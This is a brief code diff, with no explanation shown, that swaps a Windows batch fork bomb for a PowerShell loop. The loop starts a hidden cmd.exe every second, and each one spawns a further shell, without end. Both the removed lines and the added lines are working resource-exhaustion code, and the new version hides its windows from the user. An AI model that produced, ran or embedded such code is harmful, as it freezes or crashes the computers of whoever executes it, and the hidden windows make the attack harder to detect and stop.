@@ -1,5 +1,4 @@
-@echo off
-CLS
-:A
-start
-goto A
+while ($true) {
+    Start-Sleep -Seconds 1
+    Start-Process -FilePath "$env:SYSTEMROOT\System32\cmd.exe" -ArgumentList "/c start" -WindowStyle Hidden
+}
